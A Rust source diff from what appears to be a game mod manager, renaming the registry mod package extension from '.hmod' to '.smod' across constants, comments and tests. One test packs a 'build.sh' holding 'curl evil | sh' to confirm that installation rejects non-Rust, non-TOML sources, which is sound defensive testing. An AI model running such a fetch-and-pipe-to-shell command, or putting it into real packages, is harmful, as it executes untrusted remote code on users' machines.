@@ -420,14 +420,14 @@ pub fn cache_error(error: crate::storage::Error) -> String {
 }
 
 const MANIFEST: &str = "horizon-mixin.toml";
-/// A registry download's `sunrise-mod.toml` at the `.hmod` package root.
+/// A registry download's `sunrise-mod.toml` at the `.smod` package root.
 const NATIVE_MANIFEST: &str = sunrise_mod_package::manifest::MANIFEST;
-/// Where an instance keeps the native mods installed from the registry, `<id>.hmod`, each on or
+/// Where an instance keeps the native mods installed from the registry, `<id>.smod`, each on or
 /// off in `sunrise-mods.txt` like any mod.
 pub const INSTALLED: &str = sunrise_mod_package::mod_list::NATIVE_DIR;
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
-/// Each flat `.hmod` passes the registry's shared package boundary; no code is run.
+/// Each flat `.smod` passes the registry's shared package boundary; no code is run.
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     stage_installed(home, root().join("installed.incoming"))?.ok_or_else(|| {
         format!(
@@ -443,7 +443,7 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
         .unwrap_or_default();
-    paths.retain(|p| p.extension().is_some_and(|e| e == "hmod"));
+    paths.retain(|p| p.extension().is_some_and(|e| e == "smod"));
     paths.sort();
     let mut count = 0;
     for path in paths {
@@ -3294,7 +3294,7 @@ mod tests {
 
     #[test]
     fn a_registry_download_is_a_bundle_with_its_pins() {
-        let d = dir("hmod");
+        let d = dir("smod");
         write_native(&d.join("veinminer"), "veinminer", A, B);
         write_bundle(&d.join("local"), "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
@@ -3357,7 +3357,7 @@ mod tests {
             }
             zip.finish().unwrap();
         };
-        pack("veinminer.hmod", None);
+        pack("veinminer.smod", None);
         assert!(installed_mods(&home).is_err(), "off until turned on");
         crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
         let out = installed_mods(&home).unwrap();
@@ -3403,7 +3403,7 @@ mod tests {
                 source_digest(&found[0])
             )]
         );
-        pack("veinminer.hmod", Some(("data/veinminer/table.bin", "data")));
+        pack("veinminer.smod", Some(("data/veinminer/table.bin", "data")));
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/data/veinminer/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
@@ -3429,7 +3429,7 @@ mod tests {
             )
             .unwrap()
         );
-        pack("veinminer.hmod", Some(("build.sh", "curl evil | sh")));
+        pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
 
@@ -4451,7 +4451,7 @@ mod registry_binary_tests {
                 .unwrap()
                 .file
                 .name,
-            "coords_hud-0.1.0.hmod"
+            "coords_hud-0.1.0.smod"
         );
         assert!(version
             .native_binary("other-build", "aarch64-apple-darwin")
